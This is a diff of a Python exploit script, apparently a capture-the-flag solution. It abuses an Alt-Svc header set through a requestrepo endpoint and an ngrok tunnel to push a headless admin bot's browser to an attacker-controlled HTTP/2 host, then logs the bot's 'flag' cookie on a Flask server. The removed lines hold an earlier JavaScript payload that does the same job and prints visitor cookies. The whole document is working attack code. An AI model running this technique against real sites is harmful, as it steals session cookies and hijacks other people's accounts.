@@ -1,6 +1,7 @@
 import requests
 import os
 import ngrok
+import base64
 from flask import Flask, request, redirect
 
 DOMAIN = os.getenv("DOMAIN") or "192-168-0-90.traefik.me"
@@ -9,49 +10,47 @@ http2_listener = ngrok.forward("caddy:443", "tcp", authtoken_from_env=True)
 http2_host = http2_listener.url().replace("tcp://", "")
 print(f"HTTP/2 listening on {http2_host}")
 
-http1_listener = ngrok.forward("localhost:80", "tcp", authtoken_from_env=True)
-http1_host = http1_listener.url().replace("tcp://", "")
-print(f"HTTP/1 listening on {http1_host}")
+response = requests.post(url=f"https://{DOMAIN}/requestrepo/api/get_token").json()
+token = response["token"]
+subdomain = response["subdomain"]
+
+response = requests.post(
+    url=f"https://{DOMAIN}/requestrepo/api/update_file",
+    params={
+        "token": token
+    },
+    headers={
+        "Content-Type": "application/json; charset=utf-8",
+    },
+    json={
+        "headers": [
+            {
+                "value": f'h2="{http2_host}"; ma=15',
+                "header": "Alt-Svc"
+            },
+            {
+                "value": "text/html",
+                "header": "Content-Type"
+            }
+        ],
+        "raw": base64.b64encode(b"<!DOCTYPE html><script>location.reload();</script>").decode(),
+        "status_code": 200
+    }
+)
+
+requestrepo_url = f"https://{DOMAIN}/requestrepo/{subdomain}"
 
 app = Flask(__name__)
 
-@app.route("/start")
-def start():
-    exploit = f"""<script>
-    (async () => {{
-        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-        let win = window.open("https://{DOMAIN}/app/alt-svc?host={http2_host}");
-        while (true) {{
-            await sleep(1000);
-            win.location.href = "https://{DOMAIN}/app/alt-svc?host={http2_host}&random=" + Math.random();
-        }}
-    }})();
-    </script>"""
-    return exploit, 200, {"Content-Type": "text/html"}
-
-@app.route("/start2")
-def start2():
-    exploit = f"""<script>
-    (async () => {{
-        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-        let win = window.open("https://{DOMAIN}/app/alt-svc?host={http2_host}");
-        await sleep(1000);
-        win.close();
-        location.href = "https://{DOMAIN}/flag/";
-    }})();
-    </script>"""
-    return exploit, 200, {"Content-Type": "text/html"}
-
-@app.route("/app/alt-svc")
-def alt_svc():
-    print(request.cookies)
+@app.route("/requestrepo/<subdomain>")
+def request_repo(subdomain):
     return redirect(f"https://{DOMAIN}/flag/")
 
 @app.route("/flag/")
 def flag():
-    print(request.cookies)
+    print(request.cookies["flag"])
     return "ok"
 
-print(requests.post(f"https://{DOMAIN}/app/visit", data={"url": f"http://{http1_host}/start"}).json())
+print(requests.post(f"https://{DOMAIN}/app/visit", data={"url": requestrepo_url}).json())
 
 app.run(host="0.0.0.0", port=80)
